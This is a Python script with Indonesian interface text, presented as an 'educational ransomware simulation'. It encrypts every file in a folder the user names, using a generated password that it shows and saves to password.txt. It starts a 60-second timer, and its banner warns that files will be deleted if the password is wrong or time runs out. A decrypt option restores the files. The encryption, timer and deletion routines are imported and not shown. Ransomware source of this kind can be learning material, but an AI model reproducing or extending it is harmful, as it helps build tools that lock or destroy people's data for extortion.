import os
import time
from encryptor import *
from timer import start_timer
from cryptography.fernet import Fernet

def clear_screen():
    os.system("clear" if os.name == "posix" else "cls")

def banner():
    print("█" * 50)
    print("⚠️  RANSOMWARE EDUKASI - SIMULASI BERBAHAYA ⚠️")
    print("█" * 50)
    print("📁 Semua file Anda akan terenkripsi.")
    print("🔐 Hanya password yang ditampilkan bisa membuka file Anda.")
    print("⛔ Jika Anda salah password atau waktu habis, file akan dihapus.")
    print("💀 Jangan anggap ini main-main...")
    print("█" * 50)
    print()

def menu():
    clear_screen()
    banner()
    print("[1] 🔐 Enkripsi Folder")
    print("[2] 🔓 Dekripsi Folder")
    print("[3] ❌ Keluar")
    print()

def get_folder():
    folder = input("📁 Masukkan path folder target: ").strip()
    return folder

def main():
    while True:
        menu()
        choice = input("Pilih opsi (1/2/3): ").strip()
        if choice == "1":
            folder = get_folder()
            if not os.path.isdir(folder):
                print("❌ Folder tidak ditemukan!")
                input("ENTER untuk kembali...")
                continue

            print("🔄 Menyiapkan enkripsi...")
            time.sleep(1)

            password = generate_random_password()
            save_hash(password)
            key = generate_key(password)

            with open("password.txt", "w") as f:
                f.write(password)

            print(f"\n🚨 PASSWORD UNIK ANDA: \033[91m{password}\033[0m")
            print("💾 Disimpan ke file: password.txt\n")

            files = get_all_files(folder)
            if not files:
                print("📂 Folder kosong!")
                input("ENTER untuk kembali...")
                continue

            for f in files:
                if encrypt_file(f, key):
                    print(f"🔒 Enkripsi: {f}")
            print("\n⏳ Timer 60 detik dimulai. Jangan matikan program!")
            start_timer(60, folder, print)
            input("\nTekan ENTER untuk kembali ke menu...")

        elif choice == "2":
            password = input("🔑 Masukkan password: ").strip()
            folder = get_folder()
            if not os.path.isdir(folder):
                print("❌ Folder tidak ditemukan!")
                input("ENTER untuk kembali...")
                continue

            if not check_password(password):
                print("\033[91m❌ Password SALAH! File tidak bisa dibuka.\033[0m")
                input("ENTER untuk kembali...")
                continue

            key = generate_key(password)
            files = get_all_files(folder)
            for f in files:
                if decrypt_file(f, key):
                    print(f"🔓 Dekripsi: {f}")
            print("✅ Semua file berhasil dikembalikan.")
            input("ENTER untuk kembali ke menu...")

        elif choice == "3":
            print("👋 Keluar dari program...")
            break
        else:
            print("⚠️ Opsi tidak valid!")
            input("ENTER untuk kembali...")

if __name__ == "__main__":
    main()
